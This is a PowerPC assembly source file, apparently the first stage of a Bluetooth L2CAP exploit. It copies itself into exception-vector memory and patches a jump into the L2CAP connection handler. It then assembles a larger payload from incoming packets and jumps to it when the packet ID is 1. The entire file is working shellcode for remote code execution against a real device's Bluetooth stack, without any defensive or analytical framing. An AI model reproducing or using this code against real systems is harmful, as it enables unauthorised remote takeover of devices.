/*  Copyright 2019  Dexter Gerig  <dexgerig@gmail.com>
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

	.globl _start
_start:
	nop # 0x0
	nop # 0x4
	b _realstart # 0x8
	nop # 0xc Overwritten during exploit
	
_realstart:
	# First we copy our selves to the empty interrupt execption vectors as a place to live without trashing something.
	mr 4, 3
	lis 3, dest@h ; ori 3, 3, dest@l
	lis 5, (_end - _start)@h ; ori 5, 5, (_end - _start)@l
	bl memcpy
	lis 4, (_end - _start)@h ; ori 4, 4, (_end - _start)@l
	bl store_region
	
	# Patch ourselves into the switch statement
	lis 3, switch_addr@h ; ori 3, 3, switch_addr@l
	lis 4, jump_address@h ; ori 4, 4, jump_address@l
	stw 4, 0(3)
	
	# Return to the call as such
	# l2cu_reject_connection(r15, 0, 0, 'S0')
	li 6, 0x5330
	b return_from_switch

jump_payload:
	lis 6, payload_addr@h ; ori 6, 6, payload_addr@l
	mtctr 6
	bctr

jump_address:
	# compare ID field of packet, 0 == append to payload, 1 == jump to payload
	cmpwi 25, 1
	beq jump_payload
	
	lis 3, payload_offset@h ; ori 3, 3, payload_offset@l
	lwz 4, 0(3)
	
	# go ahead and increment it now
	add 0, 4, 17
	stw 0, 0(3)
	
	# copy in new part of payload
	mr 3, 4
	addi 4, 16, 4
	mr 5, 17
	bl memcpy
	mr 4, 17
	bl store_region
	
	# Return to the call as such
	# l2cu_reject_connection(r15, 0, 0, 'GD')
	li 6, 0x4744
	
return_from_switch:
	mr 3, 15
	li 4, 0
	li 5, 0
	# Prepare r6 before you jump here
	lis 7, switch_break@h ; ori 7, 7, switch_break@l
	mtctr 7
	bctr

store_region:
	li 5, 31
	rlwinm 3, 3, 0, 0, 26
	add 4, 4, 5
	srwi 4, 4, 5
	mtctr 4
0:	dcbst 0, 3
	sync
	icbi 0, 3
	addi  3, 3, 32
	bdnz 0b
	sync
	isync
	blr

# Clobbers r6, be careful
memcpy:
	mr 6, 3
	mtctr 5
	subi 3, 3, 1
	subi 4, 4, 1
1:	lbzu 0, 1(4)
	stbu 0, 1(3)
	bdnz 1b
	mr 3, 6
	blr

payload_offset:
	.long payload_addr

_end:
